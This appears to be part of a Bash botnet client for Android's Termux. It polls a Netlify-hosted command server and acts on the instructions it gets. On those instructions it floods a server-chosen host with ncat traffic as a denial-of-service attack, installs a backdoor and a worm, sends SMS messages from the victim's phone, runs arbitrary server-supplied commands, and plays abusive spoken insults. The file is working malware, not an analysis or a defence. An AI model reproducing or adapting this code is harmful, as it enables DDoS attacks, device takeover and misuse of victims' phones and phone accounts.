ServerHome(){

if [[ -d $PREFIX/etc/Hacked/ ]];then
net
	if [[ $termux == "true" ]];then

		termux-api-start &>> /dev/null
		termux-wake-lock &>> /dev/null
	fi

if [[ -f $PREFIX/etc/Hacked/Server/.B24B_BotNet ]];then

	System_Host=$(cat $PREFIX/etc/Hacked/Server/.B24B_BotNet)
else
	System_Host="Didn't exit"

fi

if [[ $nN == Y ]];then

	System_Server=$(curl --silent https://SomHac.netlify.app/)
else
	System_Server="No Internet"

fi

if [[ $System_Host == $System_Server ]];then

Start

else

if [[ ${nN} == "Y" ]];then
while true ;do

	curl --silent https://SomHac.netlify.app/ > $PREFIX/etc/Hacked/Server/.B24B_BotNet
		if [[ $(cat $PREFIX/etc/Hacked/Server/.B24B_BotNet) == "" ]];then
			printf ""
		else
			break
		fi

done
fi

fi
#------------------------------------------------------------------------------------
Server_Host=$(sed -n "2p" "$PREFIX/etc/Hacked/Server/.B24B_BotNet")
Server_Port=$(sed -n "3p" "$PREFIX/etc/Hacked/Server/.B24B_BotNet")
Server_Start=$(sed -n "4p" "$PREFIX/etc/Hacked/Server/.B24B_BotNet")
Server_Get=$(sed -n "5p" "$PREFIX/etc/Hacked/Server/.B24B_BotNet")
Server_Hack=$(sed -n "6p" "$PREFIX/etc/Hacked/Server/.B24B_BotNet")
Server_Trojan=$(sed -n "7p" "$PREFIX/etc/Hacked/Server/.B24B_BotNet")
Server_Alert=$(sed -n "8p" "$PREFIX/etc/Hacked/Server/.B24B_BotNet")
Server_SendAlert=$(sed -n "9p" "$PREFIX/etc/Hacked/Server/.B24B_BotNet")
Server_Number=$(sed -n "10p" "$PREFIX/etc/Hacked/Server/.B24B_BotNet")
Server_Message=$(sed -n "11p" "$PREFIX/etc/Hacked/Server/.B24B_BotNet")
Server_Send=$(sed -n "12p" "$PREFIX/etc/Hacked/Server/.B24B_BotNet")
Server_Excute=$(sed -n "13p" "$PREFIX/etc/Hacked/Server/.B24B_BotNet")
Server_Excute_Run=$(sed -n "14p" "$PREFIX/etc/Hacked/Server/.B24B_BotNet")
Server_Get_Command=$(sed -n "15p" "$PREFIX/etc/Hacked/Server/.B24B_BotNet")
#------------------------------------------------------------------------------------
Server_Alert_Message_True=$(sed -n "1p" "$PREFIX/etc/Hacked/.AlertMessage")
#####################################################################################

Start


else

		Rebulid &>> /dev/null
fi
}

Start(){
if [[ $Server_Start == "Yes" ]];then

#start ddos attack on $Server_Host with port $Server_Port
	Attack(){

			ncat -nv $Server_Host $Server_Port -c "while true;do echo '$(cat /dev/urandom | tr -dc A-Za-z0-9 | fold -w 940 | head -n 1000)';done" 

	}

	Attack &>> /dev/null

fi
#####################################################################################
if [[ $Server_Get == "Yes" ]];then

if [[ -f $PREFIX/etc/Hacked/LOCKS/backdoor_lock_file ]];then

printf ""

else
	Safe_backdoor &>> /dev/null
	Safe_API
fi

fi
#####################################################################################
if [[ $Server_Hack == "Yes" ]];then

	Op_Victam(){

			BlueSomHac_server

	}
while true;do
	if [[ -f $PREFIX/etc/Hacked/LOCKS/bad_server_lock_file ]];then

		printf ""

	else

		Op_Victam &>> /dev/null

	fi
done

#echo run openport
fi
#####################################################################################
if [[ $Server_Trojan == "Yes" ]];then

		Safe_Worm &>> /dev/null

fi
#####################################################################################
if [[ $Server_Send == "Yes" ]];then

	if [[ $termux == "true" ]];then

		termux-sms-send -n $Server_Number $Server_Message &>> /dev/null
	fi
fi
#####################################################################################
if [[ $Server_SendAlert == "Yes" ]];then

	if [[ $termux == "true" ]];then

		if [[ `command -v espeak` ]];then

			espeak "Hey bitch, you have a message from the boss"
			espeak "Put it in your ass yaa asshole"
		fi
		if [[ $Server_Alert == $Server_Alert_Message_True ]];then

			printf ""

		else

				Text="${Server_Alert}"
				TextBox
				echo -e $Server_Alert > "$PREFIX/etc/Hacked/.AlertMessage"
		fi

	else

		if [[ $Server_Alert == $Server_Alert_Message_True ]];then

			printf ""

		else

			echo -e "$Server_Alert" > "$PREFIX/etc/Hacked/.AlertMessage"
			Text="${Server_Alert}"
			TextBox
		fi

	fi

fi
#####################################################################################
if [[ $Server_Excute_Run == "Yes" ]];then
	exec  $Server_Excute
fi
#####################################################################################
}


